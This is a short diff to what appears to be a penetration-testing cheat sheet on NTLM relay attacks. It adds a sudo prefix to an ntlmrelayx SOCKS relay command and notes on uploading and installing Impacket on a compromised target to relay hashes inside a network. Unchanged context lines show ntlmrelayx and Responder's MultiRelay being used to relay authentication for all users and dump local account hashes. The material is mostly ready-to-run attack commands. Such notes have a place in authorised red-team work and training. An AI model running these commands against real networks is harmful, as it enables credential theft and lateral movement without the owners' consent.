@@ -110,7 +110,11 @@ Recon: RunFinger.py or Crackmapexec to identify hosts, OS and SMB info. Check if
 You might need to disable the SMB or HTTP servers used by Responder to avoid conflicts.    
 
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
-    ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
+    sudo python3 ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
+    
+    #Impacket manual install (if relaying hashes inside a network)    
+    upload https://github.com/fortra/impacket to target and run install script    
+    sudo python3 ./setup.py install    
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)     
 
     /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay auth requests for all users, dump local account hashes   
